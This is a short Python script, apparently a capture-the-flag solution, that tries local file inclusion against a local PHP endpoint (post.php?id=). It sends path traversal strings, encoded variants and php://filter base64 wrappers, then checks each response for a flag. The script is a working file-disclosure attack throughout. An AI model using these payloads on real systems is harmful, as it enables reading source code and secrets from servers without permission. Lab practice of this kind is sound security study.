import requests
import base64
from urllib.parse import quote, quote_plus

base_url = "http://127.0.0.1:32904/post.php"

# Test different path variations for FLAG.php
test_cases = [
    # Direct in posts directory
    "../FLAG.php",
    "FLAG.php",
    "./FLAG.php",
    "posts/FLAG.php",
    
    # Path traversal from posts directory
    "../../../FLAG.php",
    "../../FLAG.php",
    
    # With different encoding
    "..%2FFLAG.php",
    "%2e%2e%2fFLAG.php",
    "..%252FFLAG.php",
    
    # Mixed case
    "../flag.php",
    "../Flag.php",
    "flag.php",
    
    # Without extension
    "FLAG",
    "../FLAG",
    
    # Using wrappers on different paths
    "php://filter/convert.base64-encode/resource=../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../FLAG.php",
]

print("Testing FLAG.php access attempts...")
print("=" * 60)

for payload in test_cases:
    try:
        response = requests.get(base_url, params={'id': payload}, timeout=5)
        content_length = len(response.content)
        
        # Check for different response sizes (5326 = "Post not found")
        if content_length != 5326:
            print(f"✓ DIFFERENT RESPONSE for: {payload}")
            print(f"  Length: {content_length} bytes")
            
            # Check for FLAG pattern
            if b'FLAG{' in response.content or b'flag{' in response.content:
                print(f"  🚩 FLAG FOUND!")
                print(response.text[:500])
            elif b'<?' in response.content[:100] or 'base64' in response.text[:200]:
                print(f"  Possible base64 content detected")
                print(response.text[:300])
        else:
            print(f"✗ Blocked: {payload}")
            
    except Exception as e:
        print(f"ERROR with {payload}: {str(e)}")

print("\n" + "=" * 60)
print("Testing complete. Checking for any findings...")

